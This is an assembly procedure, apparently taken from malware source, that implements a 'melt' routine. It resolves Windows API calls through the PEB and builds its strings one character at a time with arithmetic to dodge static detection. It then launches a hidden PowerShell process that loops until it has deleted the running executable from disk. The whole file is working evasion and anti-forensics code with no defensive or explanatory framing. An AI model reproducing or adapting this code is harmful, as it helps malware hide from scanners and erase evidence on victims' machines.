proc Melt
	local	ExecutablePath[MAX_PATH + 1]:WORD
	local	Verb[10]:WORD
	local	FileName[50]:WORD
	local	Arguments[MAX_PATH + 1]:WORD
	local	Arguments[MAX_PATH + 1]:WORD

	; Get executable filename
	lea		eax, [ExecutablePath]
	pebcall	PEB_Kernel32Dll, PEB_GetModuleFileNameW, NULL, eax, MAX_PATH
	cmp		eax, 0
	jle		.ret

	; Verb: "open"
	lea		eax, [Verb]
	; Load string: open
	mov		ebx, 'a'
	add		bx, 14
	mov		word[eax + 0], bx ;o
	inc		bx
	mov		word[eax + 2], bx ;p
	sub		bx, 11
	mov		word[eax + 4], bx ;e
	add		bx, 9
	mov		word[eax + 6], bx ;n
	mov		word[eax + 8], 0

	; Filename: "powershell"
	lea		eax, [FileName]
	; Load string: powershell
	mov		ebx, 'a'
	add		bx, 15
	mov		word[eax + 0], bx ;p
	dec		bx
	mov		word[eax + 2], bx ;o
	add		bx, 8
	mov		word[eax + 4], bx ;w
	sub		bx, 18
	mov		word[eax + 6], bx ;e
	add		bx, 13
	mov		word[eax + 8], bx ;r
	inc		bx
	mov		word[eax + 10], bx ;s
	sub		bx, 11
	mov		word[eax + 12], bx ;h
	sub		bx, 3
	mov		word[eax + 14], bx ;e
	add		bx, 7
	mov		word[eax + 16], bx ;l
	mov		word[eax + 18], bx ;l
	mov		word[eax + 20], 0

	; Load arguments part 1
	lea		eax, [Arguments]
	; Load string: $file='
	mov		ebx, 'a'
	sub		bx, 61
	mov		word[eax + 0], bx ;$
	add		bx, 66
	mov		word[eax + 2], bx ;f
	add		bx, 3
	mov		word[eax + 4], bx ;i
	add		bx, 3
	mov		word[eax + 6], bx ;l
	sub		bx, 7
	mov		word[eax + 8], bx ;e
	sub		bx, 40
	mov		word[eax + 10], bx ;=
	sub		bx, 22
	mov		word[eax + 12], bx ;'
	mov		word[eax + 14], 0

	; Append executable filename to arguments
	lea		eax, [Arguments]
	lea		ebx, [ExecutablePath]
	pebcall	PEB_Kernel32Dll, PEB_lstrcatW, eax, ebx

	; Append arguments part 2
	lea		eax, [Arguments]
	pebcall	PEB_Kernel32Dll, PEB_lstrlenW, eax
	lea		eax, [Arguments + eax * 2]
	; Load string: ';for($i=1;$i -le 600 -and (Test-Path $file -PathType leaf);$i++){Remove-Item $file;Start-Sleep -m 100}
	mov		ebx, 'a'
	sub		bx, 58
	mov		word[eax + 0], bx ;'
	add		bx, 20
	mov		word[eax + 2], bx ;;
	add		bx, 43
	mov		word[eax + 4], bx ;f
	add		bx, 9
	mov		word[eax + 6], bx ;o
	add		bx, 3
	mov		word[eax + 8], bx ;r
	sub		bx, 74
	mov		word[eax + 10], bx ;(
	sub		bx, 4
	mov		word[eax + 12], bx ;$
	add		bx, 69
	mov		word[eax + 14], bx ;i
	sub		bx, 44
	mov		word[eax + 16], bx ;=
	sub		bx, 12
	mov		word[eax + 18], bx ;1
	add		bx, 10
	mov		word[eax + 20], bx ;;
	sub		bx, 23
	mov		word[eax + 22], bx ;$
	add		bx, 69
	mov		word[eax + 24], bx ;i
	sub		bx, 73
	mov		word[eax + 26], bx ; 
	add		bx, 13
	mov		word[eax + 28], bx ;-
	add		bx, 63
	mov		word[eax + 30], bx ;l
	sub		bx, 7
	mov		word[eax + 32], bx ;e
	sub		bx, 69
	mov		word[eax + 34], bx ; 
	add		bx, 22
	mov		word[eax + 36], bx ;6
	sub		bx, 6
	mov		word[eax + 38], bx ;0
	mov		word[eax + 40], bx ;0
	sub		bx, 16
	mov		word[eax + 42], bx ; 
	add		bx, 13
	mov		word[eax + 44], bx ;-
	add		bx, 52
	mov		word[eax + 46], bx ;a
	add		bx, 13
	mov		word[eax + 48], bx ;n
	sub		bx, 10
	mov		word[eax + 50], bx ;d
	sub		bx, 68
	mov		word[eax + 52], bx ; 
	add		bx, 8
	mov		word[eax + 54], bx ;(
	add		bx, 44
	mov		word[eax + 56], bx ;T
	add		bx, 17
	mov		word[eax + 58], bx ;e
	add		bx, 14
	mov		word[eax + 60], bx ;s
	inc		bx
	mov		word[eax + 62], bx ;t
	sub		bx, 71
	mov		word[eax + 64], bx ;-
	add		bx, 35
	mov		word[eax + 66], bx ;P
	add		bx, 17
	mov		word[eax + 68], bx ;a
	add		bx, 19
	mov		word[eax + 70], bx ;t
	sub		bx, 12
	mov		word[eax + 72], bx ;h
	sub		bx, 72
	mov		word[eax + 74], bx ; 
	add		bx, 4
	mov		word[eax + 76], bx ;$
	add		bx, 66
	mov		word[eax + 78], bx ;f
	add		bx, 3
	mov		word[eax + 80], bx ;i
	add		bx, 3
	mov		word[eax + 82], bx ;l
	sub		bx, 7
	mov		word[eax + 84], bx ;e
	sub		bx, 69
	mov		word[eax + 86], bx ; 
	add		bx, 13
	mov		word[eax + 88], bx ;-
	add		bx, 35
	mov		word[eax + 90], bx ;P
	add		bx, 17
	mov		word[eax + 92], bx ;a
	add		bx, 19
	mov		word[eax + 94], bx ;t
	sub		bx, 12
	mov		word[eax + 96], bx ;h
	sub		bx, 20
	mov		word[eax + 98], bx ;T
	add		bx, 37
	mov		word[eax + 100], bx ;y
	sub		bx, 9
	mov		word[eax + 102], bx ;p
	sub		bx, 11
	mov		word[eax + 104], bx ;e
	sub		bx, 69
	mov		word[eax + 106], bx ; 
	add		bx, 76
	mov		word[eax + 108], bx ;l
	sub		bx, 7
	mov		word[eax + 110], bx ;e
	sub		bx, 4
	mov		word[eax + 112], bx ;a
	add		bx, 5
	mov		word[eax + 114], bx ;f
	sub		bx, 61
	mov		word[eax + 116], bx ;)
	add		bx, 18
	mov		word[eax + 118], bx ;;
	sub		bx, 23
	mov		word[eax + 120], bx ;$
	add		bx, 69
	mov		word[eax + 122], bx ;i
	sub		bx, 62
	mov		word[eax + 124], bx ;+
	mov		word[eax + 126], bx ;+
	sub		bx, 2
	mov		word[eax + 128], bx ;)
	add		bx, 82
	mov		word[eax + 130], bx ;{
	sub		bx, 41
	mov		word[eax + 132], bx ;R
	add		bx, 19
	mov		word[eax + 134], bx ;e
	add		bx, 8
	mov		word[eax + 136], bx ;m
	add		bx, 2
	mov		word[eax + 138], bx ;o
	add		bx, 7
	mov		word[eax + 140], bx ;v
	sub		bx, 17
	mov		word[eax + 142], bx ;e
	sub		bx, 56
	mov		word[eax + 144], bx ;-
	add		bx, 28
	mov		word[eax + 146], bx ;I
	add		bx, 43
	mov		word[eax + 148], bx ;t
	sub		bx, 15
	mov		word[eax + 150], bx ;e
	add		bx, 8
	mov		word[eax + 152], bx ;m
	sub		bx, 77
	mov		word[eax + 154], bx ; 
	add		bx, 4
	mov		word[eax + 156], bx ;$
	add		bx, 66
	mov		word[eax + 158], bx ;f
	add		bx, 3
	mov		word[eax + 160], bx ;i
	add		bx, 3
	mov		word[eax + 162], bx ;l
	sub		bx, 7
	mov		word[eax + 164], bx ;e
	sub		bx, 42
	mov		word[eax + 166], bx ;;
	add		bx, 24
	mov		word[eax + 168], bx ;S
	add		bx, 33
	mov		word[eax + 170], bx ;t
	sub		bx, 19
	mov		word[eax + 172], bx ;a
	add		bx, 17
	mov		word[eax + 174], bx ;r
	add		bx, 2
	mov		word[eax + 176], bx ;t
	sub		bx, 71
	mov		word[eax + 178], bx ;-
	add		bx, 38
	mov		word[eax + 180], bx ;S
	add		bx, 25
	mov		word[eax + 182], bx ;l
	sub		bx, 7
	mov		word[eax + 184], bx ;e
	mov		word[eax + 186], bx ;e
	add		bx, 11
	mov		word[eax + 188], bx ;p
	sub		bx, 80
	mov		word[eax + 190], bx ; 
	add		bx, 13
	mov		word[eax + 192], bx ;-
	add		bx, 64
	mov		word[eax + 194], bx ;m
	sub		bx, 77
	mov		word[eax + 196], bx ; 
	add		bx, 17
	mov		word[eax + 198], bx ;1
	dec		bx
	mov		word[eax + 200], bx ;0
	mov		word[eax + 202], bx ;0
	add		bx, 77
	mov		word[eax + 204], bx ;}
	mov		word[eax + 206], 0

	; Execute
	lea		eax, [Verb]
	lea		ebx, [FileName]
	lea		ecx, [Arguments]
	pebcall	PEB_Shell32Dll, PEB_ShellExecuteW, NULL, eax, ebx, ecx, NULL, SW_HIDE

.ret:
	xor		eax, eax
	ret
endp
